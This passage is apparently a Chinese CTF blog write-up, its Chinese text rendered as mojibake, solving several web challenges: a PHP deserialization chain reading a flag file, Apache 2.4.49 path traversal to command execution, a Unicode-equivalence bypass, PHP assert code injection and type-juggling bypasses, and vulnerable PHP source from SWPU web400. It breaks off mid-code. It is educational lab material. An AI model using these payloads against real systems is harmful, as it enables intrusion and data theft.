class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>=<span class="string">&#x27;5659&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sakura</span> = <span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry=<span class="keyword">new</span> <span class="title class_">Heraclqs</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;apple=<span class="variable">$sakura</span>;</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape-&gt;<span class="built_in">SplFileObject</span>=<span class="string">&#x27;/1_ffffffflllllagggggg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sakura</span>));</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231104320343.png" alt="image-20241231104320343" style="zoom: 67%;" />





<h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>æ‰“å¼€åé¡µé¢é‡Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰«ç›®å½•ä¹Ÿæ²¡ä»€ä¹ˆç‰¹åˆ«å…³é”®çš„ä¿¡æ¯ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090545818.png" alt="image-20250101090545818"></p>
<p>çœ‹åˆ°ä¸€å †cgiï¼Ÿï¼Ÿçœ‹ä¸Šå»åƒæ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯å¤åˆ¶ç²˜è´´è¿‡å»å‘ç°ä¸è¡Œï¼Œçœ‹çœ‹æ¡†æ¶ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090618525.png" alt="image-20250101090618525" style="zoom: 67%;" />



<p>Apache2.4.49ï¼Œæœä¸‹æœ‰æ²¡æœ‰æ´ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090736212.png" alt="image-20250101090736212"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091459532.png" alt="image-20250101091459532"></p>
<p>è·¯å¾„ç©¿è¶Š</p>
<p>ä½†æˆ‘ä»¬ç›´æ¥è¯•cgi-binç›®å½•ä¸‹æ˜¯ä¸å¯ä»¥çš„ã€‚</p>
<p>ä½†æ˜¯è¿™ä¸ªå¯ä»¥&#x2F;cgi-bin&#x2F;test-cgi</p>
<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091449658.png" alt="image-20250101091449658" style="zoom:67%;" />

<p>å¯ä»¥grepéå†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo;grep -r &quot;NSS&quot; /flag_is_here</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091544695.png" alt="image-20250101091544695"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;5949084d-677b-43d8-ae0e-f156c491e4f2&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085153202.png" alt="image-20250101085153202" style="zoom:80%;" />

<p>è¿™é‡Œå…ˆå°è¯•id1ï¼Œå’Œä»·æ ¼2</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085554674.png" alt="image-20250101085554674"></p>
<p>è¿™é‡Œæ˜¾ç¤ºå•†å“é”™è¯¯</p>
<p>ç„¶åå°è¯•idï¼Œ1,2,3éƒ½æ˜¯ä¸€æ ·çš„é”™è¯¯</p>
<p>id&#x3D;4æ—¶ï¼Œè¾“å…¥1337çš„é”™è¯¯æ˜¯<code>only one char</code></p>
<p>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦</p>
<p>è¿™é‡Œåˆ©ç”¨çš„æ¼æ´æ˜¯unicodeå®‰å…¨é—®é¢˜ï¼Œæ˜¯å…³äºUniondeç­‰ä»·æ€§çš„æ¼æ´</p>
<p>è¿™é‡Œç”±äºåªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œåˆ©ç”¨äº†<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=utf-8%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">utf-8ç¼–ç </a>ã€‚</p>
<p>ä¸¤ä¸ªä¸åŒç¼–ç çš„Unicodeå­—ç¬¦å¯èƒ½å­˜åœ¨ä¸€å®šçš„ç­‰ä»·æ€§ï¼Œè¿™ç§ç­‰ä»·æ˜¯å­—ç¬¦æˆ–å­—ç¬¦åºåˆ—ä¹‹é—´æ¯”è¾ƒå¼±çš„ç­‰ä»·ç±»å‹ï¼Œè¿™äº›å˜ä½“å½¢å¼å¯èƒ½ä»£è¡¨åœ¨æŸäº›å­—ä½“æˆ–è¯­å¢ƒä¸­å­˜åœ¨è§†è§‰ä¸Šæˆ–æ„ä¹‰ä¸Šçš„ç›¸ä¼¼æ€§ã€‚</p>
<p>è¿™é‡Œåœ¨compartç½‘ç«™ä¸Šæ‰¾ä¸€ä¸ªå¤§äº1337çš„å€¼,äºæ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦æ¯”1337å¤§çš„æ•°å­—</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p>
<p>åœ¨æœç´¢æ¡†ä¸­æœç´¢thousand</p>
<p>è¿™é‡Œæˆ‘é€‰æ‹©äº†ç½—é©¬æ•°å­—åä¸‡ï¼Œæ•°å€¼æ˜¯100000</p>
<p>utf-8çš„å€¼æ˜¯0xE2 0x86 0x88</p>
<p>è¿™é‡Œç›´æ¥ä½¿ç”¨utf-8çš„è¯æ˜¯ä¸è¡Œçš„</p>
<p>å°†utf-8çš„å€¼ä¸­çš„0xå˜ä¸º%</p>
<p>%E2%86%88</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085700376.png" alt="image-20250101085700376"></p>
<h2 id="NSSRound-17-Basic-çœŸÂ·ç­¾åˆ°"><a href="#NSSRound-17-Basic-çœŸÂ·ç­¾åˆ°" class="headerlink" title="[NSSRound#17 Basic]çœŸÂ·ç­¾åˆ°"></a>[NSSRound#17 Basic]çœŸÂ·ç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!æ­¤è·¯ä¸é€šï¼ï¼&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™é‡Œä¸æ˜¯è¯´äº†å—ï¼ï¼ï¼å¿…é¡»æ˜¯ 732339662 (æ‹›æ–°ç¾¤ç¾¤å·ï¼)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å•Šï¼Ÿè¿™æ˜¯ä»€ä¹ˆæ–°å‹æ¯”è¾ƒï¼Ÿ&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ˜¯ä¸æ˜¯é¢˜é”™äº†å•Š&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°å…³é”®ç‚¹æ˜¯ <code>$_GET[&#39;nss&#39;] == 732339662</code> å’Œ <code>assert(&quot;is_numeric($_GET[nss])==0&quot;)</code></p>
<p>æ­¤å¤„ assret ç›´æ¥é‡‡ç”¨å­—ç¬¦ä¸² assert, ä¹Ÿå°±æ˜¯è¯´ä¼ å…¥çš„å˜é‡ä¼šè¢«ç›´æ¥è§£æå‡ºæ¥æ‹¼æ¥åˆ°ä»£ç ä¸­</p>
<p>å¼±æ¯”è¾ƒçš„è¯åªéœ€è¦å­—ç¬¦ä¸²å‰é¢æ˜¯ç›¸åŒæ•°å­—, åé¢æ— è®ºæ‹¼æ¥äº†ä»€ä¹ˆéƒ½ä¸ä¼šç®¡äº†</p>
<p>äºæ˜¯æˆ‘ä»¬ä»€ä¹ˆéƒ½å¯ä»¥æ„é€ , æ¯”å¦‚ <code>732339662) or (1</code> å³å¯æ‹¿ flag</p>
<h2 id="NSSRound-16-Basic-äº†è§£è¿‡PHPç‰¹æ€§å—"><a href="#NSSRound-16-Basic-äº†è§£è¿‡PHPç‰¹æ€§å—" class="headerlink" title="[NSSRound#16 Basic]äº†è§£è¿‡PHPç‰¹æ€§å—"></a>[NSSRound#16 Basic]äº†è§£è¿‡PHPç‰¹æ€§å—</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;rce.php&quot;</span>);</span><br><span class="line"><span class="variable">$checker_1</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_2</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_3</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_4</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_114</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;114&#x27;</span>];</span><br><span class="line"><span class="variable">$_514</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;514&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr4y</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arr4y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$checker_1</span> &amp;&amp; <span class="variable">$checker_2</span> &amp;&amp; <span class="variable">$checker_3</span> &amp;&amp; <span class="variable">$checker_4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rce</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹numï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸èƒ½åŒ¹é…åˆ°æ•°å­—ï¼Œintvalååˆè¦ç­‰äº1.</p>
<p>å¯ä»¥ç”¨éç©ºæ•°ç»„ç»•è¿‡ï¼Œ?num[]&#x3D;1è¿™é‡Œçš„1ä¸ä¼šè¢«æ­£åˆ™åŒ¹é…åˆ°ã€‚</p>
<p>ç„¶åçœ‹è¿™é‡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>md5ç»•è¿‡ï¼Œæ‰¾ä¸€ä¸ªçº¯å­—æ¯çš„å’Œä¸€ä¸ªçº¯æ•°å­—çš„åä¸€ä¸‹å°±å¥½ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctype=YcGyb&amp;is_num=807016042</span><br></pre></td></tr></table></figure>



<p>ç„¶åï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>?114&#x3D;1e9&amp;514&#x3D;99999999999aå³å¯ã€‚</p>
<p>æœ€åï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•°ç»„ä¸­ä¸èƒ½åŒ¹é…åˆ°NSSä¸”æ•°ç»„çš„å€¼è¢«intvalè¿‡äº†ï¼Œä¸å¯èƒ½ä¸ºNSSã€‚æ­¤å¤„æœ‰ä¸€ä¸ªarray_searchï¼Œæ˜¯å¼±æ¯”è¾ƒï¼Œ0&#x3D;&#x3D;0ç»•è¿‡å³å¯ï¼ŒNSSä¸æ•°å­—æ¯”è¾ƒæ—¶ä¸º0.å› æ­¤array[]&#x3D;0å³å¯ã€‚ç´¢å¼•ä¹Ÿæ˜¯0ï¼Œç¬¦åˆã€‚</p>
<h2 id="SWPU-2016-web400"><a href="#SWPU-2016-web400" class="headerlink" title="[SWPU 2016]web400"></a>[SWPU 2016]web400</h2><p>æºç æ²¡æœ‰ç»™ï¼Œåªèƒ½å»wpé‡Œé¢æ‰¾äº†ã€‚</p>
<p>common.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&quot;_POST&quot;</span>,<span class="string">&quot;_GET&quot;</span>,<span class="string">&quot;_COOKIE&quot;</span>) <span class="keyword">as</span> <span class="variable">$key</span>)&#123;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$$key</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$v</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;hello,hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$k</span>[<span class="number">0</span>] !=<span class="string">&#x27;_&#x27;</span>?<span class="variable">$$k</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$v</span>):<span class="variable">$$k</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>riji.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] !== <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">                <span class="variable">$sql1</span> = <span class="string">&quot;select * from msg where userid= <span class="subst">$id</span> order by id&quot;</span>;</span><br><span class="line">                <span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>);</span><br><span class="line">                <span class="variable">$result1</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$temp</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$query</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result1</span>[]=<span class="variable">$temp</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$result1</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span 